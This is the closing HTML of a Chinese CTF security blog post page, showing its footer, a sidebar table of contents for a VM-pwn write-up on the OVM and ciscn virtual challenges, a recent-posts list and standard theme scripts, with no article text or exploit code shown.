+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="https://zikh26.github.io">ZIKH26</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="https://zikh26.github.io/posts/ccd7886.html">https://zikh26.github.io/posts/ccd7886.html</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="https://zikh26.github.io" target="_blank">ZIKH26's Blog</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/vm-pwn/">vm pwn</a></div><div class="post_share"><div class="social-share" data-image="/img/17.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/posts/afa5cfa3.html"><img class="prev-cover" src="/img/6.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">关于unlink的学习总结</div></div></a></div><div class="next-post pull-right"><a href="/posts/82a683c0.html"><img class="next-cover" src="/img/1.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">关于侧信道爆破的学习总结</div></div></a></div></nav><hr/><div id="post-comment"><div class="comment-head"><div class="comment-headline"><i class="fas fa-comments fa-fw"></i><span> 评论</span></div></div><div class="comment-wrap"><div><div class="vcomment" id="vcomment"></div></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="/img/me.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">ZIKH26</div><div class="author-info__description">万古凡间一过客，九天之上第一仙</div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">97</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">99</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">11</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/ZIKH26"><i class="fab fa-github"></i><span>Follow Me</span></a><div class="card-info-social-icons is-center"><a class="social-icon" href="https://github.com/ZIKH26" target="_blank" title="Github"><i class="fab fa-github"></i></a><a class="social-icon" href="mailto:2777256035@qq.com" target="_blank" title="Email"><i class="fas fa-envelope"></i></a></div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%80%BB%E7%BB%93%EF%BC%9A"><span class="toc-number">1.</span> <span class="toc-text">总结：</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#OGeek2019-Final-OVM"><span class="toc-number">2.</span> <span class="toc-text">[OGeek2019 Final]OVM</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BF%9D%E6%8A%A4%E7%AD%96%E7%95%A5"><span class="toc-number">2.1.</span> <span class="toc-text">保护策略</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%A8%8B%E5%BA%8F%E9%80%BB%E8%BE%91"><span class="toc-number">2.2.</span> <span class="toc-text">程序逻辑</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E6%80%9D%E8%B7%AF"><span class="toc-number">2.3.</span> <span class="toc-text">利用思路</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#EXP"><span class="toc-number">2.4.</span> <span class="toc-text">EXP</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ciscn-2019-qual-virtual"><span class="toc-number">3.</span> <span class="toc-text">ciscn_2019_qual_virtual</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BF%9D%E6%8A%A4%E7%AD%96%E7%95%A5-1"><span class="toc-number">3.1.</span> <span class="toc-text">保护策略</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%A8%8B%E5%BA%8F%E9%80%BB%E8%BE%91-1"><span class="toc-number">3.2.</span> <span class="toc-text">程序逻辑</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%8E%A7%E5%88%B6%E5%A0%86%E5%9D%97%E4%B8%8Etext-data-stack"><span class="toc-number">3.2.1.</span> <span class="toc-text">控制堆块与text data stack</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%8E%B7%E5%8F%96%E6%93%8D%E4%BD%9C%E7%A0%81%E7%9A%84%E5%87%BD%E6%95%B0"><span class="toc-number">3.2.2.</span> <span class="toc-text">获取操作码的函数</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%8E%B7%E5%8F%96%E6%95%B0%E6%8D%AE%E7%9A%84%E5%87%BD%E6%95%B0"><span class="toc-number">3.2.3.</span> <span class="toc-text">获取数据的函数</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%A4%84%E7%90%86%E6%8C%87%E4%BB%A4%E5%87%BD%E6%95%B0"><span class="toc-number">3.2.4.</span> <span class="toc-text">处理指令函数</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#push%E5%87%BD%E6%95%B0"><span class="toc-number">3.2.4.1.</span> <span class="toc-text">push函数</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#add%E5%87%BD%E6%95%B0"><span class="toc-number">3.2.4.2.</span> <span class="toc-text">add函数</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#save%E5%87%BD%E6%95%B0"><span class="toc-number">3.2.4.3.</span> <span class="toc-text">save函数</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#load%E5%87%BD%E6%95%B0"><span class="toc-number">3.2.4.4.</span> <span class="toc-text">load函数</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E6%80%9D%E8%B7%AF-1"><span class="toc-number">3.3.</span> <span class="toc-text">利用思路</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#EXP-1"><span class="toc-number">3.4.</span> <span class="toc-text">EXP</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%82%E8%80%83%E6%96%87%E7%AB%A0"><span class="toc-number">4.</span> <span class="toc-text">参考文章</span></a></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/posts/d1f081a9.html" title="D-Link DIR-815路由器溢出漏洞分析"><img src="/img/4.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="D-Link DIR-815路由器溢出漏洞分析"/></a><div class="content"><a class="title" href="/posts/d1f081a9.html" title="D-Link DIR-815路由器溢出漏洞分析">D-Link DIR-815路由器溢出漏洞分析</a><time datetime="2023-05-23T05:07:26.119Z" title="发表于 2023-05-23 13:07:26">2023-05-23</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/posts/919c29c4.html" title="IOT安全入门学习--MIPS汇编基础"><img src="/img/24.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="IOT安全入门学习--MIPS汇编基础"/></a><div class="content"><a class="title" href="/posts/919c29c4.html" title="IOT安全入门学习--MIPS汇编基础">IOT安全入门学习--MIPS汇编基础</a><time datetime="2023-05-15T07:51:54.338Z" title="发表于 2023-05-15 15:51:54">2023-05-15</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/posts/81a94eee.html" title="预测urandom的输出"><img src="/img/feiji.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="预测urandom的输出"/></a><div class="content"><a class="title" href="/posts/81a94eee.html" title="预测urandom的输出">预测urandom的输出</a><time datetime="2023-05-14T23:36:47.683Z" title="发表于 2023-05-15 07:36:47">2023-05-15</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/posts/ded1a676.html" title="通过创建的线程开启shell绕过沙箱"><img src="/img/29.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="通过创建的线程开启shell绕过沙箱"/></a><div class="content"><a class="title" href="/posts/ded1a676.html" title="通过创建的线程开启shell绕过沙箱">通过创建的线程开启shell绕过沙箱</a><time datetime="2023-05-14T23:36:47.680Z" title="发表于 2023-05-15 07:36:47">2023-05-15</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/posts/9107d8ac.html" title="虎符CTF2022 babygame"><img src="/img/4.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="虎符CTF2022 babygame"/></a><div class="content"><a class="title" href="/posts/9107d8ac.html" title="虎符CTF2022 babygame">虎符CTF2022 babygame</a><time datetime="2023-05-14T23:36:47.677Z" title="发表于 2023-05-15 07:36:47">2023-05-15</time></div></div></div></div></div></div></main><footer id="footer" style="background-image: url('/img/17.jpg')"><div id="footer-wrap"><div class="copyright">&copy;2022 - 2023 By ZIKH26</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div><div class="footer_custom_text">Hi，欢迎来<a href="https://zikh26.github.io/">我的博客</a>!!!</div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><a class="icon-V hidden" onclick="switchNightMode()" title="浅色和深色模式转换"><svg width="25" height="25" viewBox="0 0 1024 1024"><use id="modeicon" xlink:href="#icon-moon"></use></svg></a><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><a id="to_comment" href="#post-comment" title="直达评论"><i class="fas fa-comments"></i></a><button id="go-up" type="button" title="回到顶部"><i class="fas fa-arrow-up"></i></button></div></div><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">搜索</span><span id="loading-status"></span><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="is-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  数据库加载中</span></div><div class="search-wrap"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="搜索文章" type="text"/></div></div><hr/><div id="local-search-results"></div></div></div><div id="search-mask"></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.umd.min.js"></script><script src="/js/search/local-search.js"></script><div class="js-pjax"><script>function loadValine () {
+  function initValine () {
+    const valine = new Valine(Object.assign({
+      el: '#vcomment',
+      appId: 'GEgJnxmVMmtk5TO9ntcgogeL-gzGzoHsz',
+      appKey: 'FJXLkmbCYXC6IqkCRKgQzTJf',
+      avatar: 'monsterid',
+      serverURLs: '',
+      emojiMaps: "",
+      path: window.location.pathname,
+      visitor: true
+    }, null))
+  }
+
+  if (typeof Valine === 'function') initValine() 
+  else getScript('https://cdn.jsdelivr.net/npm/valine/dist/Valine.min.js').then(initValine)
+}
+
+if ('Valine' === 'Valine' || !false) {
+  if (false) btf.loadComment(document.getElementById('vcomment'),loadValine)
+  else setTimeout(loadValine, 0)
+} else {
+  function loadOtherComment () {
+    loadValine()
+  }
+}</script></div><script src="/js/sun_moon.js" async></script><link rel="stylesheet" href="/css/font.css"><canvas class="fireworks" mobile="false"></canvas><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/fireworks.min.js"></script><script defer="defer" id="ribbon" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/canvas-ribbon.min.js" size="150" alpha="0.6" zIndex="-1" mobile="false" data-click="false"></script><script defer="defer" id="fluttering_ribbon" mobile="false" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/canvas-fluttering-ribbon.min.js"></script><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/activate-power-mode.min.js"></script><script>POWERMODE.colorful = true;
+POWERMODE.shake = false;
+POWERMODE.mobile = false;
+document.body.addEventListener('input', POWERMODE);
+</script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>
